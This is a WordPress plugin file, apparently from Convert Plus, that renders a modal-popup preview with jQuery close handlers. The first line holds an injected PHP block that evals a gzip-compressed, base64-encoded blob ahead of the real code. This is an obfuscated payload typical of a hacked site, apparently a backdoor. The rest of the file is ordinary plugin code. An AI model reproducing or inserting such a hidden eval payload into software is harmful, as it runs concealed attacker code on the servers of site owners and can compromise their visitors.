<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );

/*
* Preview Style
*/
require_once( CP_BASE_DIR_MODAL . '/functions/functions.options.php' );

$style           = esc_attr( $_GET['style'] );
$settings_method = esc_attr( $_GET['method'] );
$template_name   = esc_attr( $_GET['temp_name'] );

$options = Smile_Modals::$options;
$styles  = $options[ $style ];
$css     = isset( $styles['style_css'] ) ? $styles['style_css'] : '';
if ( '' !== $css ) {
	echo '<link rel="stylesheet" id="' . $style . '" href="' . $css . '" type="text/css" media="all" />';
}
$style_options = $options[ $style ]['options'];

$settings_encoded = cp_get_live_preview_settings( 'modal', $settings_method, $style_options, $template_name );

echo do_shortcode( '[smile_modal style="' . $style . '" settings_encoded="' . $settings_encoded . ' "][/smile_modal]' );
?>
<script type="text/javascript">
	jQuery(document).ready(function(e) {
		jQuery(".cp-overlay").addClass("cp-open");
		jQuery("#TB_ajaxContent").appendTo("body");
		jQuery("#TB_overlay").remove();
		jQuery("body").on("click",".cp-overlay", function(){
			jQuery(this).removeClass("cp-open");
			jQuery("#TB_ajaxContent").remove();
			jQuery("#TB_window").remove();
			jQuery("#TB_overlay").trigger("click");
			jQuery("body").removeClass("modal-open");
		});
		jQuery("body").on("click",".cp-modal-content",function(e){
			e.preventDefault();
			e.stopPropagation();
		});
	});

	jQuery(document).ready(function(){
		jQuery(document).bind('keydown', function(e) {
			if (e.which === 27) {
				var cp_overlay = jQuery(".cp-open");
				var modal = cp_overlay;
				modal.fadeOut('slow').remove();
				jQuery("#TB_ajaxContent").remove();
				jQuery("#TB_window").remove();
				jQuery("#TB_overlay").remove();
			}
		});
	});

</script>
